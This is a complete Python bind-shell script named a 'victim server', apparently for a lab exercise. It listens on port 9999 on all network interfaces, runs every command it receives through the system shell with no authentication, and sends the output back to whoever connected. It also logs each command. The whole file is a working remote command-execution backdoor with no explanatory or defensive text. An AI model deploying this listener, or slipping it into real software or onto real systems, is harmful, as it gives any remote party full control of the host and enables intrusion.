import socket
import subprocess
import logging

HOST = '0.0.0.0'
PORT = 9999


logging.basicConfig(
    filename='victim_server.py.log',
    level=logging.INFO,
    format='%(message)s'
)

def log(msg):
    print(msg)
    logging.info(msg)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        log("[+] Victim output:")
        log(output.strip())  
        return output
    except Exception as e:
        return f"[!] Execution error: {e}"

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        log(f"[+] Victim server listening on {HOST}:{PORT}")
        try:
            while True:
                conn, addr = s.accept()
                with conn:
                    log(f"[+] Connected by {addr}")
                    data = conn.recv(4096)
                    if not data:
                        log("[!] No data received. Client may have disconnected.")
                        continue
                    command = data.decode().strip()
                    log(f"[+] Received command: {command}")

                    output = execute_command(command)
                    try:
                        conn.sendall(output.encode())
                    except Exception as e:
                        log(f"[!] Error sending response: {e}")
        except KeyboardInterrupt:
            log("[!] Server shutdown requested by user.")

if __name__ == "__main__":
    main()
